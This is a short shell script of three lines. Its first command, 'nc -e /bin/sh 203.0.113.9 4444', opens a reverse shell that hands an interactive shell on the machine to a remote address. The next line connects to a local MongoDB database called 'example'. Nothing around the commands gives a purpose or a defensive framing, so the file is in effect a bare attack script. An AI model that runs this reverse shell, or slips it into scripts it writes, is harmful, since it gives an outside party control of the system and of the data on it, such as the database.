#!/bin/sh
nc -e /bin/sh 203.0.113.9 4444
mongosh mongodb://localhost:27017/example
